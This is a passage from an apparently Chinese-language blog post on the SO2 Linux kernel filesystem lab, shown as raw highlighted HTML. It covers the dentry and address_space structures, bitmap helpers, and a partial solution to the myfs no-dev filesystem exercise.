class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span>	<span class="title">i_mmap_rwsem</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nrpages; <span class="comment">/* 页总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nrexceptional;</span><br><span class="line">	<span class="keyword">pgoff_t</span>			writeback_index; <span class="comment">/* 回写的起始偏移 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span> <span class="comment">/* 操作函数表 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags; <span class="comment">/* 掩码与错误标识 */</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		wb_err;</span><br><span class="line">	<span class="keyword">spinlock_t</span>		private_lock; <span class="comment">/* 私有address_space锁 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">private_list</span>;</span> <span class="comment">/* 私有address_space链表 */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data; <span class="comment">/* 私有数据 */</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>)))) __randomize_layout;</span><br></pre></td></tr></table></figure>
<p><strong>The Dentry Structure</strong></p>
<p>目录项 Dentry 的主要任务是在 inode 和文件名之间建立链接，该结构的重要字段如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line">	<span class="comment">/* RCU lookup touched fields */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> d_flags;		<span class="comment">/* protected by d_lock */</span></span><br><span class="line">	<span class="keyword">seqcount_t</span> d_seq;		<span class="comment">/* per dentry seqlock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_hash</span>;</span>	<span class="comment">/* lookup hash list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span>	<span class="comment">/* 与父目录关联的目录 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span>			<span class="comment">/* 包含dentry名称和名称长度的结构体 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span>		<span class="comment">/* 此dentry引用的inode */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> d_iname[DNAME_INLINE_LEN];	<span class="comment">/* small names */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Ref lookup also touches following */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockref</span> <span class="title">d_lockref</span>;</span>	<span class="comment">/* per-dentry lock and refcount */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span> <span class="comment">/* 操作dentry的回调函数集 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span>	<span class="comment">/* The root of the dentry tree */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> d_time;		<span class="comment">/* used by d_revalidate */</span></span><br><span class="line">	<span class="keyword">void</span> *d_fsdata;			<span class="comment">/* 为实现dentry操作的文件系统保留的字段 */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span>		<span class="comment">/* LRU list */</span></span><br><span class="line">		<span class="keyword">wait_queue_head_t</span> *d_wait;	<span class="comment">/* in-lookup ones only */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span>	<span class="comment">/* child of parent list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span>	<span class="comment">/* our children */</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * d_alias and d_rcu can share memory</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_alias</span>;</span>	<span class="comment">/* inode alias list */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_in_lookup_hash</span>;</span>	<span class="comment">/* only for in-lookup ones */</span></span><br><span class="line">	 	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">	&#125; d_u;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>内核使用 Dentry 来构建并管理文件系统的目录树 </li>
<li>目录项在内核中起到了连接不同的文件对象 inode 的作用，进而起到了维护文件系统目录树的作用 </li>
</ul>
<p><strong>Bitmap operations</strong></p>
<p>使用文件系统时，管理信息（哪个 block 是空闲或忙碌，哪个 inode 是空闲或忙碌）使用位图 Bitmap 存储，为此，我们经常需要使用位运算，此类操作包括：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">find_first_zero_bit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span>; <span class="comment">/* 在bitmap指定范围内找到第一个zero bit的位置 */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">find_first_bit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span>; <span class="comment">/* 在bitmap指定范围内找到第一个bit的位置 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_bit</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">void</span> *addr)</span></span>; <span class="comment">/* 将指针指向的数据的第nr位,置&quot;1&quot; */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear_bit</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">void</span> *addr)</span></span>; <span class="comment">/* 将指针指向的数据的第nr位,置&quot;0&quot; */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_and_set_bit</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">void</span> *addr)</span></span>; <span class="comment">/* 将指针指向的数据的第nr位,置&quot;1&quot;,并返回原来这一位的值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_and_clear_bit</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">void</span> *addr)</span></span>; <span class="comment">/* 将指针指向的数据的第nr位,置&quot;0&quot;,并返回原来这一位的值 */</span></span><br></pre></td></tr></table></figure>
<p>下面列出了一些用法示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> array_map[NUM_BYTES];</span><br><span class="line"><span class="keyword">size_t</span> idx;</span><br><span class="line"><span class="keyword">int</span> changed;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find first zero bit in 32 bit integer. */</span></span><br><span class="line">idx = find_first_zero_bit(&amp;<span class="built_in">map</span>, <span class="number">32</span>);</span><br><span class="line">printk (KERN_ALERT <span class="string">&quot;The %zu-th bit is the first zero bit.\n&quot;</span>, idx);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find first one bit in NUM_BYTES bytes array. */</span></span><br><span class="line">idx = find_first_bit(array_map, NUM_BYTES * <span class="number">8</span>);</span><br><span class="line">printk (KERN_ALERT <span class="string">&quot;The %zu-th bit is the first one bit.\n&quot;</span>, idx);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Clear the idx-th bit in integer.</span></span><br><span class="line"><span class="comment"> * It is assumed idx is less the number of bits in integer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">clear_bit(idx, &amp;<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Test and set the idx-th bit in array.</span></span><br><span class="line"><span class="comment"> * It is assumed idx is less the number of bits in array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">changed = __test_and_set_bit(idx, &amp;sbi-&gt;imap);</span><br><span class="line"><span class="keyword">if</span> (changed)</span><br><span class="line">      printk(KERN_ALERT <span class="string">&quot;%zu-th bit changed\n&quot;</span>, idx);</span><br></pre></td></tr></table></figure>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=filesystems make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>1.myfs 完整代码：</p>
<p>首先，我们计划熟悉 Linux 内核和虚拟文件系统 （VFS） 组件公开的界面：</p>
<ul>
<li>设计并使用一个简单的虚拟文件系统（即没有物理磁盘支持）</li>
<li>文件系统称为 <strong>myfs</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 Lab - Filesystem drivers</span></span><br><span class="line"><span class="comment"> * Exercise #1 (no-dev filesystem)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pagemap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple no-dev filesystem&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYFS_BLOCKSIZE		4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYFS_BLOCKSIZE_BITS	12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYFS_MAGIC		0xbeefcafe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_LEVEL		KERN_ALERT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* declarations of functions that are part of operation structures */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">myfs_mknod</span><span class="params">(struct inode *dir,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct dentry *dentry, <span class="keyword">umode_t</span> mode, <span class="keyword">dev_t</span> dev)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">myfs_create</span><span class="params">(struct inode *dir, struct dentry *dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">umode_t</span> mode, <span class="keyword">bool</span> excl)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">myfs_mkdir</span><span class="params">(struct inode *dir, struct dentry *dentry, <span class="keyword">umode_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 2: define super_operations structure */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> <span class="title">myfs_ops</span> =</span> &#123;</span><br><span class="line">	.statfs		= simple_statfs,</span><br><span class="line">	.drop_inode	= generic_drop_inode,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> <span class="title">myfs_dir_inode_operations</span> =</span> &#123;</span><br><span class="line">	<span class="comment">/* TODO 5: Fill dir inode operations structure. */</span></span><br><span class="line">	.create         = myfs_create,</span><br><span class="line">	.lookup         = simple_lookup,</span><br><span class="line">	.link           = simple_link,</span><br><span class="line">	.unlink         = simple_unlink,</span><br><span class="line">	.mkdir          = myfs_mkdir,</span><br><span class="line">	.rmdir          = simple_rmdir,</span><br><span class="line">	.mknod          = myfs_mknod,</span><br><span class="line">	.rename         = simple_rename,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">myfs_file_operations</span> =</span> &#123;</span><br><span class="line">	<span class="comment">/* TODO 6: Fill file operations structure. */</span></span><br><span class="line">	.read_iter      = generic_file_read_iter,</span><br><span class="line">	.write_iter     = generic_file_write_iter,</span><br><span class="line">	.mmap           = generic_file_mmap,</span><br><span class="line">	.llseek         = generic_file_llseek,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> <span class="title">myfs_file_inode_operations</span> =</span> &#123;</span><br><span class="line">	<span class="comment">/* TODO 6: Fill file inode operations structure. */</span></span><br><span class="line">	.getattr        = simple_getattr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> <span class="title">myfs_aops</span> =</span> &#123;</span><br><span class="line">	<span class="comment">/* TODO 6: Fill address space operations structure. */</span></span><br><span class="line">	.readpage       = simple_readpage,</span><br><span class="line">	.write_begin    = simple_write_begin,</span><br><span class="line">	.write_end      = simple_write_end,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct inode *<span class="title">myfs_get_inode</span><span class="params">(struct super_block *sb, <span class="keyword">const</span> struct inode *dir,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> new_inode(sb);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 3: fill inode structure</span></span><br><span class="line"><span class="comment">	 *     - mode</span></span><br><span class="line"><span class="comment">	 *     - uid</span></span><br><span class="line"><span class="comment">	 *     - gid</span></span><br><span class="line"><span class="comment">	 *     - atime,ctime,mtime</span></span><br><span class="line"><span class="comment">	 *     - ino</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	inode_init_owner(inode, dir, mode);</span><br><span class="line">	inode-&gt;i_atime = current_time(inode);</span><br><span class="line">	inode-&gt;i_mtime = current_time(inode);</span><br><span class="line">	inode-&gt;i_ctime = current_time(inode);</span><br><span class="line">	inode-&gt;i_ino = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 5: Init i_ino using get_next_ino */</span></span><br><span class="line">	inode-&gt;i_ino = get_next_ino();</span><br><span class="line">	<span class="comment">/* TODO 6: Initialize address space operations. */</span></span><br><span class="line">	inode-&gt;i_mapping-&gt;a_ops = &amp;myfs_aops;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (S_ISDIR(mode)) &#123;</span><br><span class="line">		<span class="comment">/* TODO 3: set inode operations for dir inodes. */</span></span><br><span class="line">		inode-&gt;i_op = &amp;simple_dir_inode_operations;</span><br><span class="line">		inode-&gt;i_fop = &amp;simple_dir_operations;</span><br><span class="line">		<span class="comment">/* TODO 5: use myfs_dir_inode_operations for inode</span></span><br><span class="line"><span class="comment">		 * operations (i_op).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		inode-&gt;i_op = &amp;myfs_dir_inode_operations;</span><br><span class="line">		<span class="comment">/* TODO 3: directory inodes start off with i_nlink == 2 (for &quot;.&quot; entry).</span></span><br><span class="line"><span class="comment">		 * Directory link count should be incremented (use inc_nlink).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		inc_nlink(inode);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 6: Set file inode and file operations for regular files</span></span><br><span class="line"><span class="comment">	 * (use the S_ISREG macro).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (S_ISREG(mode)) &#123;</span><br><span class="line">		inode-&gt;i_op = &amp;myfs_file_inode_operations;</span><br><span class="line">		inode-&gt;i_fop = &amp;myfs_file_operations;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> inode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 5: Implement myfs_mknod, myfs_create, myfs_mkdir. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">myfs_mknod</span><span class="params">(struct inode *dir,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct dentry *dentry, <span class="keyword">umode_t</span> mode, <span class="keyword">dev_t</span> dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> myfs_get_inode(dir-&gt;i_sb, dir, mode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (inode == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line">	d_instantiate(dentry, inode);</span><br><span class="line">	dget(dentry);</span><br><span class="line">	dir-&gt;i_mtime = dir-&gt;i_ctime = current_time(inode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">myfs_create</span><span class="params">(struct inode *dir, struct dentry *dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">umode_t</span> mode, <span class="keyword">bool</span> excl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> myfs_mknod(dir, dentry, mode | S_IFREG, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">myfs_mkdir</span><span class="params">(struct inode *dir, struct dentry *dentry, <span class="keyword">umode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = myfs_mknod(dir, dentry, mode | S_IFDIR, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	inc_nlink(dir);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">myfs_fill_super</span><span class="params">(struct super_block *sb, <span class="keyword">void</span> *data, <span class="keyword">int</span> silent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">root_inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">root_dentry</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: fill super_block</span></span><br><span class="line"><span class="comment">	 *   - blocksize, blocksize_bits</span></span><br><span class="line"><span class="comment">	 *   - magic</span></span><br><span class="line"><span class="comment">	 *   - super operations</span></span><br><span class="line"><span class="comment">	 *   - maxbytes</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	sb-&gt;s_maxbytes = MAX_LFS_FILESIZE;</span><br><span class="line">	sb-&gt;s_blocksize = MYFS_BLOCKSIZE;</span><br><span class="line">	sb-&gt;s_blocksize_bits = MYFS_BLOCKSIZE_BITS;</span><br><span class="line">	sb-&gt;s_magic = MYFS_MAGIC;</span><br><span class="line">	sb-&gt;s_op = &amp;myfs_ops;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* mode = directory &amp; access rights (755) */</span></span><br><span class="line">	root_inode = myfs_get_inode(sb, <span class="literal">NULL</span>,</span><br><span class="line">			S_IFDIR | S_IRWXU | S_IRGRP |</span><br><span class="line">			S_IXGRP | S_IROTH | S_IXOTH);</span><br><span class="line"></span><br><span class="line">	printk(LOG_LEVEL <span class="string">&quot;root inode has %d link(s)\n&quot;</span>, root_inode-&gt;i_nlink);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!root_inode)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	root_dentry = d_make_root(root_inode);</span><br><span class="line">	<span class="keyword">if</span> (!root_dentry)</span><br><span class="line">		<span class="keyword">goto</span> out_no_root;</span><br><span class="line">	sb-&gt;s_root = root_dentry;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_no_root:</span><br><span class="line">	iput(root_inode);</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">myfs_mount</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">int</span> flags, <span class="keyword">const</span> <span class="keyword">char</span> *dev_name, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: call superblock mount function */</span></span><br><span class="line">	<span class="keyword">return</span> mount_nodev(fs_type, flags, data, 